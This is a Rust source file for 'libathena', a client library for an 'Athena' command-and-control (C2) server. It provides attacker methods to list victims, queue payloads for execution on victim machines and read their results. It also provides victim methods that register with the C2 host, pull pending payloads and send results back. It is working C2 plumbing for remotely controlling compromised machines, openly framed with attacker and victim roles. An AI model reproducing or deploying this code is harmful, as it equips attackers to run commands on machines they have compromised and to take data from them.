/*
 * Copyright (C) 2021  Aravinth Manivannan <realaravinth@batsense.net>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
use std::error::Error;

use derive_more::{Display, Error};
use reqwest::StatusCode;
pub use reqwest::{Client, ClientBuilder};
use serde::{Deserialize, Serialize};
use url::Url;

pub mod payload;
pub mod routes;
pub use routes::V1_ROUTES;

use payload::attack::Password;
use payload::*;

#[derive(Clone, Default)]
/// Client builder
pub struct AthenaClientBuilder {
    client: Option<Client>,
    host: Option<String>,
    password: Option<Password>,
}

impl AthenaClientBuilder {
    /// Set password to access athena C2 server
    pub fn password(&mut self, password: String) -> &mut Self {
        self.password = Some(Password { password });
        self
    }

    /// Provide client configuration
    pub fn client(&mut self, client: ClientBuilder) -> AthenaResult<&mut Self> {
        let client = client.cookie_store(true).build()?;
        self.client = Some(client);
        Ok(self)
    }

    // Set athena C2 server host
    pub fn host(&mut self, host: String) -> &mut Self {
        if host.ends_with('/') {
            self.host = Some(host[0..host.len() - 1].to_owned())
        } else {
            self.host = Some(host);
        }
        self
    }

    // Build client
    pub fn build(&mut self) -> AthenaResult<AthenaClient> {
        Ok(AthenaClient {
            client: self.client.clone().unwrap(),
            password: self.password.clone().unwrap(),
            host: Url::parse(&self.host.clone().unwrap())?,
        })
    }
}

#[derive(Clone)]
/// AthenaClient contains methods that are useful to both attackers and victims
/// Methods applicable to the attacker role are prefixed with "attacker"
/// Methods applicable to the victim role are prefixed with "victim"
pub struct AthenaClient {
    client: Client,
    host: Url,
    password: Password,
}

impl AthenaClient {
    /// Attacker: Get list of all victims currently available on the C2 server
    pub async fn attack_list_victims(&self) -> AthenaResult<Vec<attack::Victim>> {
        let url = self.host.clone().join(V1_ROUTES.attack.list_victims)?;
        Ok(self
            .client
            .post(url)
            .json(&self.password)
            .send()
            .await?
            .json()
            .await?)
    }

    /// Attacker: Set payload that needs to be executed on a victim machine
    /// A unique payload ID is returned. This ID is required to access the
    /// payload's result
    pub async fn attack_set_payload(
        &self,
        payload: &attack::Payload,
    ) -> AthenaResult<attack::PayloadID> {
        let url = self.host.clone().join(V1_ROUTES.attack.set_payload)?;
        let resp = self.client.post(url).json(&payload).send().await?;
        if resp.status() == StatusCode::OK {
            Ok(resp.json().await?)
        } else {
            let err: ErrorToResponse = resp.json().await.unwrap();
            Err(Box::new(err))
        }
    }

    /// Attacker: Read result that was submitted by a victim machine.
    /// Results are mapped against the payload ID.
    pub async fn attack_read_response(
        &self,
        payload: &attack::PayloadID,
    ) -> AthenaResult<attack::PayloadResponse> {
        let payload = attack::ResponseReq {
            id: payload.id,
            password: self.get_password().to_owned(),
        };
        let url = self.host.clone().join(V1_ROUTES.attack.read_response)?;
        let resp = self.client.post(url).json(&payload).send().await?;
        if resp.status() == StatusCode::OK {
            Ok(resp.json().await?)
        } else {
            let err: ErrorToResponse = resp.json().await.unwrap();
            Err(Box::new(err))
        }
    }

    /// Attacker: Get configured password of the C2 server
    pub fn get_password(&self) -> &str {
        &self.password.password
    }

    /// Victim: Register victim on the C2 server
    pub async fn victim_register(&self) -> AthenaResult<()> {
        let url = self.host.clone().join(V1_ROUTES.victim.join)?;
        self.client.post(url).send().await?;
        Ok(())
    }

    /// Victim: Get all payloads that are yet to be executed on the victim machine.
    /// Yet to be executed = No response submitted yet.
    pub async fn victim_get_paylod(&self) -> AthenaResult<victim::PayloadCollection> {
        let url = self.host.clone().join(V1_ROUTES.victim.get_payload)?;
        //        Ok(self.client.post(url).send().await?.json().await?)
        let resp = self.client.post(url).send().await?;
        if resp.status() == StatusCode::OK {
            //println!("{:?}", resp.json::<serde_json::Value>().await.unwrap());
            //unimplemented!();
            Ok(resp.json().await.unwrap())
        } else {
            let err: ErrorToResponse = resp.json().await.unwrap();
            Err(Box::new(err))
        }
    }

    /// Victim: Submit payload's result
    pub async fn victim_set_payload_response(
        &self,
        payload: &victim::PayloadResult,
    ) -> AthenaResult<()> {
        let url = self.host.clone().join(V1_ROUTES.victim.payload_response)?;
        let resp = self.client.post(url).json(payload).send().await?;
        if resp.status() == StatusCode::OK {
            //println!("{:?}", resp.json::<serde_json::Value>().await.unwrap());
            //unimplemented!();
            Ok(())
        } else {
            let err: ErrorToResponse = resp.json().await.unwrap();
            Err(Box::new(err))
        }
    }
}

#[derive(Serialize, Error, Display, Debug, Deserialize)]
#[cfg(not(tarpaulin_include))]
/// Error value returned from the C2 server
pub struct ErrorToResponse {
    pub error: String,
}

/// Result datatype used in libathena
pub type AthenaResult<T> = Result<T, Box<dyn Error>>;
